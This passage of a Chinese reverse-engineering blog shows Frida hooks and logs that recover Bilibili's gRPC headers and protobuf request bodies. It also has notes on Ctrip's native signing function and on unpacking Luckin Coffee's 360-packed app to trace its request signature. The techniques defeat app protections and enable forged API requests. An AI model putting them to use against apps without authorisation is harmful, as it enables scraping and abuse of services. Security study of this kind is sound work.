class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-fawkes-req-bin&#x27;</span>&#125;, [B@bad0144</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-metadata-bin&#x27;</span>&#125;, [B@59c8362</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-device-bin&#x27;</span>&#125;, [B@3e3e319</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-network-bin&#x27;</span>&#125;, [B@377fcf3</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-restriction-bin&#x27;</span>&#125;, [B@1aedb0</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-locale-bin&#x27;</span>&#125;, [B@<span class="number">6030429</span></span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-encoding&#x27;</span>&#125;, gzip</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-accept-encoding&#x27;</span>&#125;, [B@99c8e</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-timeout&#x27;</span>&#125;, <span class="number">29974835154</span></span><br><span class="line"></span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-fawkes-req-bin&#x27;</span>&#125;, [B@3e95ac2</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-metadata-bin&#x27;</span>&#125;, [B@976610e</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-device-bin&#x27;</span>&#125;, [B@3e3e319</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-network-bin&#x27;</span>&#125;, [B@df9a74b</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-restriction-bin&#x27;</span>&#125;, [B@2eb7e6e</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-locale-bin&#x27;</span>&#125;, [B@23125cc</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-encoding&#x27;</span>&#125;, gzip</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-accept-encoding&#x27;</span>&#125;, [B@99c8e</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-timeout&#x27;</span>&#125;, <span class="number">29964817236</span></span><br><span class="line"></span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-fawkes-req-bin&#x27;</span>&#125;, [B@a8ff14a</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-metadata-bin&#x27;</span>&#125;, [B@40a78bb</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-device-bin&#x27;</span>&#125;, [B@3e3e319</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-network-bin&#x27;</span>&#125;, [B@4e091d8</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-restriction-bin&#x27;</span>&#125;, [B@<span class="number">51e1931</span></span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-locale-bin&#x27;</span>&#125;, [B@663d816</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-encoding&#x27;</span>&#125;, gzip</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-accept-encoding&#x27;</span>&#125;, [B@99c8e</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-timeout&#x27;</span>&#125;, <span class="number">17982366717</span></span><br><span class="line"></span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-fawkes-req-bin&#x27;</span>&#125;, [B@fea0734</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-metadata-bin&#x27;</span>&#125;, [B@9296fa3</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-device-bin&#x27;</span>&#125;, [B@3e3e319</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-network-bin&#x27;</span>&#125;, [B@6b301b</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-restriction-bin&#x27;</span>&#125;, [B@1d90f91</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;x-bili-locale-bin&#x27;</span>&#125;, [B@74ffef6</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-encoding&#x27;</span>&#125;, gzip</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-accept-encoding&#x27;</span>&#125;, [B@99c8e</span><br><span class="line">aiVar.<span class="property">a</span> is <span class="attr">called</span>: args0=<span class="title class_">Key</span>&#123;name=<span class="string">&#x27;grpc-timeout&#x27;</span>&#125;, <span class="number">17970931768</span></span><br></pre></td></tr></table></figure><p>发现打印的参数确实是参数头，但是参数有个是对象类型不能显示，尝试把他的具体内容打印出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook 代码修改</span></span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    function <span class="title function_">bytesToString</span><span class="params">(value)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">buffer</span> <span class="operator">=</span> Java.array(<span class="string">&#x27;byte&#x27;</span>, value);</span><br><span class="line">        <span class="type">var</span> <span class="variable">StringClass</span> <span class="operator">=</span> Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> StringClass.$<span class="keyword">new</span>(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(<span class="string">&quot;---&gt;hook custom headers&quot;</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">ai</span> <span class="operator">=</span> Java.use(<span class="string">&quot;io.grpc.ai&quot;</span>);</span><br><span class="line">    ai.a.overload(<span class="string">&quot;io.grpc.ai$e&quot;</span>, <span class="string">&quot;java.lang.Object&quot;</span>).implementation = function (key, value) &#123;</span><br><span class="line">        console.log(<span class="string">&quot;=====&gt;key:&quot;</span> + key._c.value) <span class="comment">//key是对象，打印c字段的值</span></span><br><span class="line">        <span class="keyword">if</span> (value.getClass() == <span class="string">&quot;class [B&quot;</span>) &#123;    <span class="comment">//学习！！！！</span></span><br><span class="line">            <span class="type">var</span> <span class="variable">_value</span> <span class="operator">=</span> bytesToString(value);</span><br><span class="line">            console.log(<span class="string">&quot;===&gt;value:&quot;</span> + _value)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            console.log(<span class="string">&quot;===&gt;value:&quot;</span> + value)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.a(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Pixel XL::哔哩哔哩]-&gt; </span><br><span class="line">=====&gt;key:x-bili-fawkes-req-bin</span><br><span class="line">===&gt;value:</span><br><span class="line">androidprod</span><br><span class="line">=====&gt;key:x-bili-metadata-bin</span><br><span class="line">===&gt;value:android ���*huawei2%XY620C764599EE3AF2BAA2FA4090F9557E045:android</span><br><span class="line">=====&gt;key:x-bili-device-bin</span><br><span class="line">===&gt;value���%XY620C764599EE3AF2BAA2FA4090F9557E045<span class="string">&quot;android*android:huaweiBgooglePixel XLR10</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-network-bin</span></span><br><span class="line"><span class="string">===&gt;value:</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-restriction-bin</span></span><br><span class="line"><span class="string">===&gt;value:</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-locale-bin</span></span><br><span class="line"><span class="string">===&gt;value:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">zhHansCN</span></span><br><span class="line"><span class="string">zhHansCN</span></span><br><span class="line"><span class="string">=====&gt;key:grpc-encoding</span></span><br><span class="line"><span class="string">===&gt;value:gzip</span></span><br><span class="line"><span class="string">=====&gt;key:grpc-accept-encoding</span></span><br><span class="line"><span class="string">===&gt;value:identity,gzip</span></span><br><span class="line"><span class="string">=====&gt;key:grpc-timeout</span></span><br><span class="line"><span class="string">===&gt;value:29924618638</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-fawkes-req-bin</span></span><br><span class="line"><span class="string">===&gt;value:</span></span><br><span class="line"><span class="string">androidprod</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-metadata-bin</span></span><br><span class="line"><span class="string">===&gt;value:android ���*huawei2%XY620C764599EE3AF2BAA2FA4090F9557E045:android</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-device-bin</span></span><br><span class="line"><span class="string">===&gt;value���%XY620C764599EE3AF2BAA2FA4090F9557E045&quot;</span>android*android:huaweiBgooglePixel XLR10</span><br><span class="line">=====&gt;key:x-bili-network-bin</span><br><span class="line">===&gt;value:</span><br><span class="line">=====&gt;key:x-bili-restriction-bin</span><br><span class="line">===&gt;value:</span><br><span class="line">=====&gt;key:x-bili-locale-bin</span><br><span class="line">===&gt;value:</span><br><span class="line"></span><br><span class="line">zhHansCN</span><br><span class="line">zhHansCN</span><br><span class="line">=====&gt;key:grpc-encoding</span><br><span class="line">===&gt;value:gzip</span><br><span class="line">=====&gt;key:grpc-accept-encoding</span><br><span class="line">===&gt;value:identity,gzip</span><br><span class="line">=====&gt;key:grpc-timeout</span><br><span class="line">===&gt;value:<span class="number">29947106505</span></span><br><span class="line">=====&gt;key:x-bili-fawkes-req-bin</span><br><span class="line">===&gt;value:</span><br><span class="line">androidprod</span><br><span class="line">=====&gt;key:x-bili-metadata-bin</span><br><span class="line">===&gt;value:android ���*huawei2%XY620C764599EE3AF2BAA2FA4090F9557E045:android</span><br><span class="line">=====&gt;key:x-bili-device-bin</span><br><span class="line">===&gt;value���%XY620C764599EE3AF2BAA2FA4090F9557E045<span class="string">&quot;android*android:huaweiBgooglePixel XLR10</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-network-bin</span></span><br><span class="line"><span class="string">===&gt;value:</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-restriction-bin</span></span><br><span class="line"><span class="string">===&gt;value:</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-locale-bin</span></span><br><span class="line"><span class="string">===&gt;value:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">zhHansCN</span></span><br><span class="line"><span class="string">zhHansCN</span></span><br><span class="line"><span class="string">=====&gt;key:grpc-encoding</span></span><br><span class="line"><span class="string">===&gt;value:gzip</span></span><br><span class="line"><span class="string">=====&gt;key:grpc-accept-encoding</span></span><br><span class="line"><span class="string">===&gt;value:identity,gzip</span></span><br><span class="line"><span class="string">=====&gt;key:grpc-timeout</span></span><br><span class="line"><span class="string">===&gt;value:17969647288</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-fawkes-req-bin</span></span><br><span class="line"><span class="string">===&gt;value:</span></span><br><span class="line"><span class="string">androidprod</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-metadata-bin</span></span><br><span class="line"><span class="string">===&gt;value:android ���*huawei2%XY620C764599EE3AF2BAA2FA4090F9557E045:android</span></span><br><span class="line"><span class="string">=====&gt;key:x-bili-device-bin</span></span><br><span class="line"><span class="string">===&gt;value���%XY620C764599EE3AF2BAA2FA4090F9557E045&quot;</span>android*android:huaweiBgooglePixel XLR10</span><br><span class="line">=====&gt;key:x-bili-network-bin</span><br><span class="line">===&gt;value:</span><br><span class="line">=====&gt;key:x-bili-restriction-bin</span><br><span class="line">===&gt;value:</span><br><span class="line">=====&gt;key:x-bili-locale-bin</span><br><span class="line">===&gt;value:</span><br><span class="line"></span><br><span class="line">zhHansCN</span><br><span class="line">zhHansCN</span><br><span class="line">=====&gt;key:grpc-encoding</span><br><span class="line">===&gt;value:gzip</span><br><span class="line">=====&gt;key:grpc-accept-encoding</span><br><span class="line">===&gt;value:identity,gzip</span><br><span class="line">=====&gt;key:grpc-timeout</span><br><span class="line">===&gt;value:<span class="number">17955368433</span> </span><br></pre></td></tr></table></figure><p>发现确实参数1是请求头信息，参数2是乱码字符串 可以怀疑是不是请求头参数所对应的值经过了一些加密操作前的数据呢(即我们抓包抓到的是加密过后的)</p><p>发现addcommomHeader函数和里面的aiVar.a方法的参数都和ip.grpc.ai有关，objectdump这个类 观察到如下编码操作。</p><p><img src="assets/Snipaste_2020-10-05_10-11-15.png" alt="io.grpc.ai实例"></p><p>发现最终会在toString中调用这个c方法，可以hook toString一下看看最终是否被调用</p><p><img src="assets/image-20241211002648156.png" alt="image-20241211002648156"></p><p>发现没有走这个方法。可以感觉奇怪，通过上面对请求头参数相应值base解码确实有些地方对应上了，但是hook这个toString却没走，可以猜测是不是走的别的地方的base解码操作。</p><p>可以全局搜搜一下<code>BaseEncoding.b().a();</code></p><p><img src="assets/image-20241211192538958.png" alt="image-20241211192538958"></p><p>发现有四处地方，不知道调用的哪个，我们可以hook一下com.google.common.io.BaseEncoding类，结果如下<img src="assets/image-20241211193151866.png" alt="image-20241211193151866"></p><p>发现主要调用的是</p><ul><li>参数为 [B</li><li>参数为[B，int，int</li></ul><p>hook com.google.common.io.BaseEncoding.a方法<img src="assets/image-20241211194041558.png" alt="image-20241211194041558"></p><p>发现调用<code>[B，int，int</code>参数的a方法返回值正好是请求头参数的对应值(base编码后的值)</p><p>hook这个具体方法</p><p><code>android hooking watch class_method com.google.common.io.BaseEncoding.a [B,int,int --dump-args --dump-backtrace --dump-return</code></p><p><img src="assets/image-20241211222216546.png" alt="image-20241211222216546"></p><p>跟进一下后四个方法(我的)，调用流程如下图<img src="assets/Snipaste_2020-10-05_11-40-21.png" alt="最后4步调用"></p><p>再跟踪调用的过程中看到如下地方，即上图中的3，有如下数据</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">builder.a(io.grpc.<span class="keyword">internal</span>.am.j.a(), <span class="keyword">this</span>.d);  <span class="comment">//可以objectdump 这个b.hxu类看一下实例</span></span><br><span class="line">builder.a(io.grpc.<span class="keyword">internal</span>.am.h.a(), <span class="string">&quot;application/grpc&quot;</span>);</span><br><span class="line">builder.a(<span class="string">&quot;te&quot;</span>, <span class="string">&quot;trailers&quot;</span>);</span><br></pre></td></tr></table></figure><p>都是请求头相关的数据。</p><h3 id="请求头原始数据定位">请求头原始数据定位</h3><p>从前面得知，我们的请求头value经过了base编码才和抓包后的请求头value能对上，但是在addCommonHeader处hook’的是乱码==》它是原始数据经过操作才获得的</p><p>有grpc自然想到protobuf，通过观察发现一系列可疑类，且符合编译后的proto文件<img src="assets/image-20241214220221463.png" alt="image-20241214220221463"></p><p>与我们请求头参数也一一对应，猜测经过了protobuf操作，我们可以在这些类中的writeTo时来打印他们原始数据</p><p>以其中一个为例，其他的类推</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">    function <span class="title function_">dumpbytes</span><span class="params">(array)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">ptr</span> <span class="operator">=</span> Memory.alloc(array.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; array.length; ++i)</span><br><span class="line">            Memory.writeS8(ptr.add(i), array[i]);</span><br><span class="line">        console.log(hexdump(ptr, &#123; offset: <span class="number">0</span>, length: array.length, header: <span class="literal">false</span>, ansi: <span class="literal">false</span> &#125;));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">printfields</span><span class="params">(obj, fields)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> field in fields) &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">key</span> <span class="operator">=</span> fields[field];</span><br><span class="line">            <span class="type">var</span> <span class="variable">value</span> <span class="operator">=</span> obj[key + <span class="string">&quot;_&quot;</span>].value;</span><br><span class="line">            console.log(String(key).padEnd(<span class="number">15</span>, <span class="string">&quot; &quot;</span>) + <span class="string">&quot;:&quot;</span> + (value))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">var</span> <span class="variable">meta</span> <span class="operator">=</span> Java.use(<span class="string">&quot;com.bapis.bilibili.metadata.network.Network&quot;</span>);</span><br><span class="line">    meta.writeTo.implementation = function (codedOutputStream) &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">header_key</span> <span class="operator">=</span> <span class="string">&quot;x-bili-fawkes-req-bin&quot;</span>;</span><br><span class="line">        <span class="type">var</span> <span class="variable">fields</span> <span class="operator">=</span> [<span class="string">&quot;oid&quot;</span>, <span class="string">&quot;tf&quot;</span>, <span class="string">&quot;type&quot;</span>];</span><br><span class="line">        console.log(<span class="string">&quot;-----&gt;&quot;</span> + header_key + <span class="string">&quot;&lt;-----&quot;</span>);</span><br><span class="line">        printfields(<span class="built_in">this</span>, fields);</span><br><span class="line">        console.log(<span class="string">&quot;-----&gt;&lt;-----&gt;&lt;-----&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.writeTo(codedOutputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这样能够打印原来的数据</span></span><br></pre></td></tr></table></figure><h3 id="请求体定位">请求体定位</h3><p>我们在对com.google.common.io.BaseEncoding.a方法进行调用栈打印的时候发现一些可疑的类名<img src="assets/image-20241212225151784.png" alt="image-20241212225151784"></p><p>我们对这个方法进行hook <code>com.bapis.bilibili.pgc.gateway.player.v1.PlayURLMoss.playView</code></p><p>发现打印出了真实的请求体和响应体</p><p><img src="assets/image-20241212225815934.png" alt="image-20241212225815934"></p><p>同理，弹幕的请求体和响应体也能打印出来<img src="assets/image-20241212230259512.png" alt="image-20241212230259512"></p><p>但是抓包过程中抓到的是乱码 ==&gt; 存在加密</p><p>在对上述方法hook的时候发现参数实际上是<code>com.bapis.bilibili.pgc.gateway.player.v1.PlayViewReq</code>类</p><p>看类名应该是和请求有关系。hook这个类</p><p><code>android hooking watch class_method com.bapis.bilibili.pgc.gateway.player.v1.PlayViewReq</code></p><p>发现调用如下方法，有很多get，set方法，还有一个writeTo方法 ==》protobuf<img src="assets/image-20241213172851561.png" alt="image-20241213172851561"></p><p>看到这里就能怀疑是不是protobuf，像是proto文件编译后的类，因为有大量set和get和serializedSize方法来设置变量值。<img src="assets/image-20241213190722605.png" alt="image-20241213190722605"></p><p>从io.grpc.t.a开始溯源，因为他前面的函数调用我们通过hook发现是原始请求体内容数据，并没有发生变化</p><p>通过hook发现参数类型大多数是b.hya，而到了<code>io.grpc.internal.ba.b</code><img src="assets/image-20241213234315265.png" alt="image-20241213234315265"></p><p>参数类型发生了变化<img src="assets/image-20241213234419816.png" alt="image-20241213234419816"></p><p>怀疑经过了GZIP压缩，尝试找一找</p><p>点击上图中的<code>a aVar = new a()</code><img src="assets/image-20241214221100649.png" alt="image-20241214221100649"></p><p>有write函数，打印一下write调用栈，发现有GZIPOutputStream.finish，所以打印write的bArr就是gzip后的请求体数据</p><h1>算法还原系列</h1><h2 id="携程">携程</h2><p>[<a href="https://bbs.kanxue.com/thread-283569.htm">原创] 记一次xxmain.so 从去花到魔改算法还原-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p><strong>案例：携程旅行8.55.6</strong></p><p><code>simpleSign</code>方法算法还原</p><p>存在libscmain.so中，直接看so方法。</p><p>IDA中搜索静态与动态方法注册没有看到回显，如何找这个simpleSign方法呢？</p><p>通过网上开源项目，上面也有提到，然后搜索<code>simpleSign</code>方法，找到其偏移地址。<img src="assets/image-20241028230523386.png" alt="image-20241028230523386"></p><p>在<code>be11d</code></p><p>ida直接跳转到这里，发现是一堆数据，把他转换为函数。</p><p><img src="assets/image-20241028232547337.png" alt="image-20241028232547337"></p><p>发现有个JUMPOUT，应该是花指令干扰ida分析函数，看一下这个地址nop，做修改</p><h2 id="瑞幸咖啡">瑞幸咖啡</h2><p><a href="https://blog.csdn.net/xmx_000/article/details/137057088">https://blog.csdn.net/xmx_000/article/details/137057088</a></p><p><a href="https://blog.csdn.net/m0_38098782/article/details/128930150">https://blog.csdn.net/m0_38098782/article/details/128930150</a></p><p><a href="https://developer.aliyun.com/article/1330082">https://developer.aliyun.com/article/1330082</a></p><p><strong>案例：瑞幸5.0.01</strong></p><p><strong>抓登录包接口</strong></p><p><img src="assets/image-20241220182858378.png" alt="image-20241220182858378"></p><p>发现q(部分)和sign是在变化的，响应体内容也在部分变化。</p><p><strong>查壳</strong>：</p><p>发现是<code>qihoo</code>，是360的壳<br><img src="assets/image-20241220180902212.png" alt="image-20241220180902212"></p><p>尝试使用frida-dexdump脱壳，发现报错<img src="assets/image-20241220193957191.png" alt="image-20241220193957191"></p><p>无法注入这个瑞幸的进程。尝试frida attach注入也是报同样的错误。</p><p>打开瑞幸app，查看开启的相应进程<img src="assets/image-20241220194119890.png" alt="image-20241220194119890"></p><p>有两个进程，怀疑双进程占坑，使得frida无法注入。</p><p>使用frida spawn注入占坑，然后在使用frida-dexdump就可以正常脱壳，脱下来40多个，jadx加载较慢，还可以使用yang神的脱壳脚本<a href="https://github.com/lasting-yang/frida_dump">frida_dump</a> 或者fart来脱。我这里采用yang的脚本来脱，然后可以正常加载进jadx。</p><p>因为分析<code>sign</code>的加密算法，所以在jadx中可以搜索<code>sign</code>，发现没有sign，这种请求参数一般都是通过<code>key:value</code>来存放到数组或者Map中，可以hook map看一下参数内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hook</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="keyword">var</span> map=Java.use(<span class="string">&#x27;java.util.HashMap&#x27;</span>);</span><br><span class="line">        map.put.implementation=function(Key,value)&#123;</span><br><span class="line">            console.log(<span class="string">&quot;Enter HasMap...&quot;</span>);</span><br><span class="line">            console.log(Key,value);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.put(Key,value);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(hook)</span><br><span class="line">    </span><br><span class="line">sign <span class="number">164991294218207346731643271596679276400</span></span><br></pre></td></tr></table></figure><p>发现这四个请求参数都可以hook到，说明确实被加密了</p><p>打印调用栈回溯一下Map.put，发现打印出<code>sign</code>参数的调用栈如下<img src="assets/image-20241220220758271.png" alt="image-20241220220758271"></p><p>看一下这个<code>getRequestParams</code></p><p><img src="assets/image-20241220220917075.png" alt="image-20241220220917075"></p><p>发现put方法的第一个参数都是<code>StubApp.getString2</code>，hook一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">StubApp</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.stub.StubApp&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> put1=<span class="title class_">StubApp</span>.<span class="title 